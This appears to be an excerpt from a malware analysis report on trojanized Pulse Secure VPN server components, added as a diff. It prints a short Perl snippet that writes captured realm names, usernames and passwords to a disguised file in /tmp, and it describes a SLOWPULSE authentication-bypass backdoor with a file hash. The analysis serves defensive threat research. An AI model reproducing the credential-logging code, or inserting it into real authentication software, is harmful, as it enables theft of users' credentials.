@@ -1,0 +1,4 @@
+
+An excerpt of the code related to credential stealing is shown as follows: my $realmName1 = $signin->getRealmInfo()->{name}; open(*fd, \">>/tmp/dsstartssh.statementcounters\"); syswrite(*fd, \"realm=$realmName1 \", 5000); syswrite(*fd, \"username=$username \", 5000); syswrite(*fd, \"password=$password\\n\", 5000); close(*fd); SLOWPULSE Variant 1 The file libdsplibs.so with SHA256 cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68 is a trojanized ELF shared object belonging to the PulseSecure VPN server.
+The sample has been modified to bypass specific authentication mechanisms of the LDAP and RADIUS protocols.
+The sample hardcodes a backdoor key that will silently subvert auth failures if the correct backdoor key is passed, establishing a VPN connection as if auth succeeded.
